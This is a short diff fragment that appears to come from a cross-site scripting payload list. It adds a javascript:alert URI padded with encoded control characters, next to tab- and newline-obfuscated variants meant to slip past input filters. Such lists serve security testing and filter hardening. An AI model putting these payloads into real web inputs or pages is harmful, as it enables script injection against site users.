@@ -36,6 +36,7 @@ window["doc"+"ument"]["cookie"]
 
 ```
 <!--javascript -->
+&#x8; &#23;   javascript:alert('Successful XSS')
 ja&Tab;vascript:alert(1)
 java\tscript:alert(1)
 ja&NewLine;vascript:alert(1)
